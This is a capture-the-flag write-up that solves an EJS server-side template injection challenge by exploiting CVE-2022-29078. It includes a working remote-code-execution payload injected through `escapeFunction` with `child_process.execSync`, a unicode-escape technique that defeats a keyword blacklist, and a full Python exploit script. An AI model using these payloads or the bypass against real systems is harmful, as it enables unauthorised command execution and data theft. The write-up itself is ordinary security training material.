## basic injection v2

<img src="images/chall.png" width=400>

The webpage allows us to pass `username` and `settings` parameters. `username` doesn't do much since it's HTML-escaped in the rendered template, but `settings` is used as the rendering options for `ejs.render()`.  

The webpage then renders the result, but limits the output to a maximum of `35` characters.  

```js
const template = '<h1>Welcome <%= username %>!</h1>';
        
let opts = {};
if (settings) {
    try {
        opts = JSON.parse(settings);
    } catch (e) {
        opts = {};
    }
}

let result;
try {
    result = ejs.render(template, { username }, opts);
} catch (renderError) {
    result = renderError.toString();
}

const limit = result.toString().slice(0, 35);
```

In `package.json`, we can see that the webpage uses EJS `3.1.9`, which is vulnerable to [CVE-2022-29078](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307).  

```json
{
  "name": "easyssti",
  "version": "1.0.0",
  "description": "easy ssti",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "keywords": [
  ],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "express": "^4.18.2",
    "ejs": "3.1.9"
  }
}
```

The Dockerfile shows that the flag file is in root, so our goal would be to gain RCE and read the flag.  

```dockerfile
...
COPY server.js .
COPY static/style.css static/
COPY views/error.ejs views/
COPY views/index.ejs views/
COPY views/result.ejs views/
COPY flag /
EXPOSE 5000

CMD ["npm", "start"]
```

In the EJS source code, there are checks implemented for `outputFunctionName` and `localsName`, so the only injection vector is `escapeFunction`.  

To inject into `escapeFunction`, we also need to set `client` to `true`.  

```js
if (opts.client) {
    src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
    if (opts.compileDebug) {
    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
    }
}
```

This will be our base payload that we can send to the webpage using Python.  

```python
{
    'client': True,
    'escapeFunction': "1; return process.mainModule.require('child_process').execSync('cat /flag')"
}
```

The next step would be to bypass the blacklist implemented by the backend.  

Most of these can be easily bypassed using unicode escape sequences. The most troublesome part of the blacklist is the inclusion of `return`, since JavaScript doesn't allow keywords to be unicode escaped.  

Since the backend renders errors as well, we can simply use `eval()` to dynamically build a `throw` statement with the flag contents.  

An important thing to note is that `\\` isn't actually blacklisted, since the preceeding string isn't closed.  

```js
const ban = ['require', 'readFileSync', 'mainModule', 'throw', 'fs', '+', 'flag', 'exec', 'concat', 'split', 'Object', '\', \\', '=>', '*', 'x', '()', 'global', 'return', 'str', 'constructor', 'eval', 'replace', 'from', 'char', 'catch'];
const u = username.toLowerCase();
const s = settings ? settings.toLowerCase() : '';

for (const b of ban) {
    if (u.includes(b) || s.includes(b)) {
        return res.send('nope! ヾ (✿＞﹏ ⊙〃)ノ');
    }
}
```

Our revised payload will thus look like this (unobfuscated).  

```python
{
    'client': True,
    'escapeFunction': """1;eval(`throw "${{process.mainModule.require('child_process').execSync('cat /flag')}}"`)"""
}
```

Since the server limits the rendered output to `35` characters, we can read every successive `35` characters of the flag until we reach the end.  

I wrote a script to auto-obfuscate the payload and retrieve the flag incrementally.  

```python
import requests
import json

url = "http://host8.dreamhack.games:21866"

blacklist = ['require', 'readFileSync', 'mainModule', 'throw', 'fs', '+', 'flag', 'exec', 'concat', 'split', 'Object', '\', \\', '=>', '*', 'x', '()', 'global', 'return', 'str', 'constructor', 'eval', 'replace', 'from', 'char', 'catch']

def obf(s):
    return ''.join([f'\\\\u{hex(ord(c))[2:].zfill(4)}' for c in s])

flag = ""
limit = 35

while not flag.endswith("}"):
    idx = len(flag)

    payload = {
        'client': True,
        'escapeFunction': f"""1;eval(`throw "${{process.mainModule.require('child_process').execSync('cat /flag').slice({idx},{idx+limit})}}"`)"""
    }

    payload = json.dumps(payload)

    for banned in blacklist:
        if banned in payload:
            payload = payload.replace(banned, obf(banned))

    res = requests.get(url, params={ 'username': 'hi', 'settings': payload })
    flag += res.text

print("Flag:", flag)
```

Flag: `DH{d3d1c4t34Th3N3ce8e24e44033976c28f4fe92c35f}`